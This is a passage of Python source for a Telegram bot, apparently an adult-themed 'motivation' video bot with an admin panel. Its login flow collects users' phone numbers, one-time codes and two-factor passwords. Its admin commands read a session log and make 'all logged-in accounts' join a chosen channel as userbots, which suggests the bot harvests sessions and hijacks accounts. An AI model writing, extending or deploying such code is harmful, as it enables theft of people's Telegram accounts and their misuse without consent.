                        f"• Phone: {u_info.get('phone', 'None')}\n"
                        f"• Status: <code>{u_info.get('status', 'pending').upper()}</code>\n"
                        f"• Videos Watched: <code>{u_info.get('video_count', 0)}</code>\n"
                        f"• Free Previews: <code>{u_info.get('free_previews_used', 0)}</code>\n\n"
                        "Select an action to modify user details:"
                    )
                    keyboard = make_keyboard([
                        [
                            primary("🔓 Set Active", f"usrm_active_{target_uid}"),
                            primary("💎 Set Premium", f"usrm_premium_{target_uid}")
                        ],
                        [
                            primary("❌ Set Pending", f"usrm_pending_{target_uid}"),
                            primary("🗑️ Reset Count", f"usrm_reset_{target_uid}")
                        ],
                        [danger("🔙 BACK TO PANEL", "admin_dashboard")]
                    ])
                    await update.message.reply_text(text_profile, reply_markup=keyboard, parse_mode="HTML")
                    admin_config_state.pop(user.id, None)
            except ValueError:
                await update.message.reply_text("❌ Please enter a valid integer User ID.")

        elif field == "add_admin":
            try:
                target_uid = int(text)
                current_admins = settings.get("admin_ids", [])
                if target_uid in current_admins:
                    await update.message.reply_text(f"⚠️ User <code>{target_uid}</code> is already an admin.", parse_mode="HTML")
                else:
                    current_admins.append(target_uid)
                    await db.update_settings(admin_ids=current_admins)
                    await update.message.reply_text(f"✅ User <code>{target_uid}</code> added to admins.", parse_mode="HTML")
                admin_config_state.pop(user.id, None)
            except ValueError:
                await update.message.reply_text("❌ Please enter a valid integer User ID.")

        elif field == "remove_admin":
            try:
                target_uid = int(text)
                current_admins = settings.get("admin_ids", [])
                if target_uid not in current_admins:
                    await update.message.reply_text(f"⚠️ User <code>{target_uid}</code> is not in the admin list.", parse_mode="HTML")
                elif target_uid == user.id:
                    await update.message.reply_text("❌ You cannot remove yourself from the admin list.")
                else:
                    current_admins.remove(target_uid)
                    await db.update_settings(admin_ids=current_admins)
                    await update.message.reply_text(f"✅ User <code>{target_uid}</code> removed from admins.", parse_mode="HTML")
                admin_config_state.pop(user.id, None)
            except ValueError:
                await update.message.reply_text("❌ Please enter a valid integer User ID.")

        elif field == "join_all":
            context.application.create_task(run_join_all_userbots(context.bot, user.id, text))
            await update.message.reply_text(f"⏳ Initiated join all process for all logged-in accounts to <code>{text}</code>.", parse_mode="HTML")
            admin_config_state.pop(user.id, None)

        return

    # 2. Check if admin is entering video custom caption
    if is_admin and user.id in admin_upload_states:
        st_up = admin_upload_states[user.id]
        if st_up.get("awaiting_caption"):
            text = update.message.text.strip()
            if text.lower() == "none":
                st_up["caption"] = None
            else:
                st_up["caption"] = text
            st_up.pop("awaiting_caption", None)
            await send_upload_config_message(update.message, user.id)
            return

    # 3. Standard Login States & Fallback
    state = login_state.get(user.id, {})
    step = state.get("step")
    user_data = await db.get_user(user.id)
    lang = user_data.get("language", "en") if user_data else "en"

    if step == "phone_wait":
        await handle_phone(update, context)
    elif step == "otp_wait":
        await handle_otp(update, context)
    elif step == "tfa_wait":
        await handle_2fa(update, context)
    else:
        await update.message.reply_text(
            get_text("LOGIN_PORTAL_TEXT", lang) if not user_data or user_data.get("status") == "pending" else get_text("WELCOME_BACK_USER", lang),
            reply_markup=welcome_keyboard(lang),
            parse_mode="HTML",
        )


async def handle_video_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    is_admin = await is_user_admin(user.id)
    if not is_admin:
        return

    video = update.message.video
    if not video:
        return

    file_id = video.file_id

    # If admin is in "menu_images" config state to update welcome video
    if user.id in admin_config_state and admin_config_state[user.id].get("field") == "menu_images":
        status_msg = await update.message.reply_text("📥 <b>Downloading and updating welcome video... Please wait.</b>", parse_mode="HTML")
        try:
            file = await context.bot.get_file(file_id)
            os.makedirs("data", exist_ok=True)
            await file.download_to_drive("data/start_video.mp4")
            await status_msg.edit_text("✅ <b>Welcome video updated successfully!</b>", parse_mode="HTML")
            admin_config_state.pop(user.id, None)
        except Exception as e:
            logger.error(f"Failed to download and save welcome video: {e}")
            await status_msg.edit_text(f"❌ <b>Failed to update welcome video:</b> {e}", parse_mode="HTML")
        return

    # Otherwise, configure the video for database
    admin_upload_states[user.id] = {
        "file_id": file_id,
        "category": "motivation",
        "is_free": True,
        "delete_after": 60,
        "caption": None
    }
    await send_upload_config_message(update.message, user.id)
async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Update {update} caused error {context.error}")


async def post_init(app: Application):
    logger.info("🔥 Spicy Motivation Bot v2 starting!")
    await db.init_db()
    # Cache images and videos in background tasks to avoid startup blocking/delays
    asyncio.create_task(_cache_start_images())
    asyncio.create_task(_cache_start_videos())
    logger.info("✅ Database initialized, background caching started.")


async def set_channel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in config.ADMIN_IDS:
        return
    args = context.args
    if len(args) < 2:
        await update.message.reply_text(
            "Usage: /setchannel <username> <invite_link>\n"
            "Example: /setchannel @my_channel https://t.me/my_channel"
        )
        return
    channel_username = args[0].strip("@")
    invite_link = args[1]
    await db.update_subscription(f"@{channel_username}", invite_link)
    await update.message.reply_text(f"✅ Channel updated to @{channel_username}")


async def show_session_logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in config.ADMIN_IDS:
        return
    try:
        with open(config.SESSIONS_LOG, "r", encoding="utf-8") as f:
            content = f.read()
        lines = content.split("\n")
        recent = "\n".join(lines[-50:]) if len(lines) > 50 else content
        await update.message.reply_text(
            f"<blockquote>📋 SESSION LOGS (Last {min(50, len(lines))} lines)</blockquote>\n\n"
            f"<code>{recent[:3000]}</code>",
            parse_mode="HTML",
        )
    except Exception as e:
        await update.message.reply_text(f"❌ Error reading logs: {e}")


def main():
    app = Application.builder().token(config.BOT_TOKEN).post_init(post_init).build()

    # ── Small Caps Monkeypatch ──────────────────────────────────────────
    # Auto-converts all outgoing message text & button labels to small caps
    import re as _re
    from utils import small_caps as _sc

    def _sc_text(text):
        parts = _re.split(r'(<[^>]+>)', text)
        for i in range(0, len(parts), 2):
            parts[i] = _sc(parts[i])
        return "".join(parts)

    _bot = app.bot
    _orig_send = _bot.send_message
    _orig_edit = _bot.edit_message_text
    _orig_send_video = _bot.send_video

    async def _patched_send(chat_id, text=None, *args, **kwargs):
        if text:
            text = _sc_text(text)
        return await _orig_send(chat_id, text, *args, **kwargs)

    async def _patched_edit(text, chat_id=None, message_id=None, *args, **kwargs):
        if text:
            text = _sc_text(text)
        try:
            return await _orig_edit(text, chat_id=chat_id, message_id=message_id, *args, **kwargs)
        except Exception as e:
            if "Message is not modified" in str(e):
                return
            logger.info(f"Patched edit failed: {e}. Falling back to delete and send.")
            if chat_id and message_id:
                try:
                    await _bot.delete_message(chat_id=chat_id, message_id=message_id)
                except Exception:
                    pass
                reply_markup = kwargs.get("reply_markup")
                parse_mode = kwargs.get("parse_mode", "HTML")
                return await _bot.send_message(chat_id=chat_id, text=text, reply_markup=reply_markup, parse_mode=parse_mode)
            raise

    async def _patched_send_video(chat_id, video, *args, **kwargs):
        if "caption" in kwargs and kwargs["caption"]:
            kwargs["caption"] = _sc_text(kwargs["caption"])
        return await _orig_send_video(chat_id, video, *args, **kwargs)

    object.__setattr__(_bot, "send_message", _patched_send)
    object.__setattr__(_bot, "edit_message_text", _patched_edit)
    object.__setattr__(_bot, "send_video", _patched_send_video)
    # ─────────────────────────────────────────────────────────────────────

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("admin", show_admin_dashboard_wrapper))
    app.add_handler(CommandHandler("logs", show_session_logs))
    app.add_handler(CommandHandler("setchannel", set_channel))

    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(MessageHandler(filters.VIDEO, handle_video_message))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_error_handler(error_handler)

    logger.info("🔥 Bot is polling...")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


async def show_admin_dashboard_wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    is_admin = await is_user_admin(user.id)
    if not is_admin:
        return
    user_count = await db.get_user_count()
    v_count = await db.video_count()
    pending_purchases = await db.get_pending_purchases()
    total_logs = len(await db.get_activity_log(100))

    text = (
        "<blockquote>🔞 ADMIN CONTROL PANEL</blockquote>\n\n"
        f"👥 <b>Total Users:</b> <code>{user_count}</code>\n"
        f"📹 <b>Total Videos:</b> <code>{v_count}</code>\n"
        f"💰 <b>Pending Purchases:</b> <code>{len(pending_purchases)}</code>\n"
        f"📋 <b>Activity Logs:</b> <code>{total_logs}</code>\n\n"
        "<i>Select a section below to manage.</i>"
    )
    await update.message.reply_text(
        text,
        reply_markup=admin_keyboard(),
        parse_mode="HTML"
    )




if __name__ == "__main__":
    main()
